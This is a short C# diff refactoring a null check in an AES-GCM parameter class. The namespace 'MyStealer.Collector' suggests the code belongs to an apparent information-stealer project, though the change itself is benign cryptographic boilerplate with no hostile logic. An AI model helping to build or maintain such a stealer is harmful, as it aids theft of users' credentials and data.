@@ -20,11 +20,8 @@ namespace MyStealer.Collector.Utils.BcAesGcm
 		 */
         public AeadParameters(KeyParameter key, int macSize, byte[] nonce, byte[] associatedText)
         {
-            if (nonce == null)
-                throw new ArgumentNullException(nameof(nonce));
-
             this.key = key;
-            this.nonce = nonce;
+            this.nonce = nonce ?? throw new ArgumentNullException(nameof(nonce));
             this.macSize = macSize;
             this.associatedText = associatedText;
         }
